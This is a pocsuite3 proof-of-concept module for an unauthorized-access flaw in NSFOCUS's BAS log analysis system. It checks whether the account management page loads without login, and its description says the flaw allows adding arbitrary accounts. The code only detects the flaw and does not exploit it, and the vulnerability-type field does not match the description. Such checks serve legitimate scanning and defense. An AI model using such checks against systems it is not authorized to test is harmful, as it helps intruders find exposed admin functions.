from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import json,random,time
class DemoPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '绿盟 BAS日志数据安全性分析系统 accountmanage 未授权访问漏洞'
    appName = '绿盟'
    appVersion = '未知'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''绿盟 BAS日志数据安全性分析系统存在未授权访问漏洞，通过漏洞可以添加任意账户登录平台获取敏感信息'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):#验证模式
        result = {}
        try:
            target = self.url+"/accountmanage/index"
            r = requests.get(url=target,timeout=8,verify=False)
            if r.status_code == 200 and "账号管理" in r.text:
                result['verifyInfo'] = {}
                result['verifyInfo']['URL'] = target
                return self.parse_output(result)
        except:
            return


    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(DemoPOC)